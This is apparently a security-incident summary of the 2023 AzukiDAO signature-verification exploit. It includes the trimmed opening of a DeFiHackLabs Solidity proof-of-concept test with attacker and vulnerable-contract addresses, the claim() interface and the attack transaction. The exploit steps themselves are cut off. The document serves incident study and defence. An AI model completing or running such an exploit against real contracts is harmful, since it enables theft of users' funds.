# [?] AzukiDAO - Invalid signature verification

## Summary
Severity: Unknown
Chain: Ethereum
Component: AzukiDAO
Published: 2023-07-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/AzukiDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$69k
References:
- https://twitter.com/sharkteamorg/status/1676892088930271232

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$69K
// Attacker : https://etherscan.io/address/0x85d231c204b82915c909a05847cca8557164c75e
// Vulnerable Contract : https://etherscan.io/address/0x8189afbe7b0e81dae735ef027cd31371b3974feb
// Attack Tx : https://etherscan.io/tx/0x6233c9315dd3b6a6fcc7d653f4dca6c263e684a76b4ad3d93595e3b8e8714d34

// @Analysis
// https://twitter.com/sharkteamorg/status/1676892088930271232

interface IBean is IERC20 {
    function claim(
        address[] memory _contracts,
        uint256[] memory _amounts,
        uint256[] memory _tokenIds,
        uint256 _claimAmount,
        uint256 _endTime,
        bytes memory _signature
    ) external;
}

contract AzukiTest is Test {
    IERC20 AZUKI = IERC20(0xED5AF388653567Af2F388E6224dC7C4b3241C544);
    IBean Bean = IBean(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB);
    address private constant Elemental = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
    address private constant Beanz = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
    address private constant azukiDAOExploiter = 0x85D231C204B82915c909A05847CCa8557164c75e;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/AzukiDAO_exp.sol_
